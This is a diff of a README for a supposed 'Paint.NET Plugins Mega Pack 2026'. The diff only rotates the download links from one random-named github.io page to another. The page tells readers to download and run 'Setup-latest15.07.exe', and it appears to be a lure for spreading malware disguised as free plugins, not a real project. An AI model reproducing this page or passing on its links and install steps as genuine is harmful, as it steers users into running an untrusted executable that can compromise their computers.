@@ -2,7 +2,7 @@
 
 The Paint.NET Plugins Mega Pack 2026 is the ultimate collection of effects, tools, and adjustments designed to enhance your photo editing and graphic design workflow in Paint.NET. This pack includes over 100 new plugins, from color correction effects to custom brushes, all compatible with Windows 10 and 11. Whether you're a professional designer or a hobbyist, this mega pack provides everything you need to elevate your creative projects in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -31,7 +31,7 @@ The Paint.NET Plugins Mega Pack 2026 offers a wide range of features to supercha
 
 Installing the Paint.NET Plugins Mega Pack 2026 is straightforward and only takes a few minutes. Follow these steps to get started on your Windows 10 or 11 system:
 
-1. **Download the Installer**: Click the download button above or visit the [Download Page](https://yellowtaxisave.github.io/download-page/) to get the installer file named **Setup-latest15.07.exe**. Save it to a location like your Downloads folder for easy access.
+1. **Download the Installer**: Click the download button above or visit the [Download Page](https://capitals-707-bringing.github.io/download-page/) to get the installer file named **Setup-latest15.07.exe**. Save it to a location like your Downloads folder for easy access.
 2. **Run the Installer**: Double-click on **Setup-latest15.07.exe** to launch the installation wizard. Ensure Paint.NET is closed during the installation process to avoid conflicts or file access issues.
 3. **Follow the Prompts**: The installer will guide you through the setup. Choose the default installation directory or select a custom path if preferred. You can also select specific plugins to install via the custom option, tailoring the pack to your needs.
 4. **Complete Installation**: Once installed, restart Paint.NET if it was open. The new plugins will appear in the Effects and Tools menus, organized by category for easy navigation. If you encounter any issues, refer to the FAQ section below.
@@ -62,7 +62,7 @@ A5: Yes, the Paint.NET Plugins Mega Pack 2026 is completely free for personal an
 
 For the latest version of the Paint.NET Plugins Mega Pack 2026, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
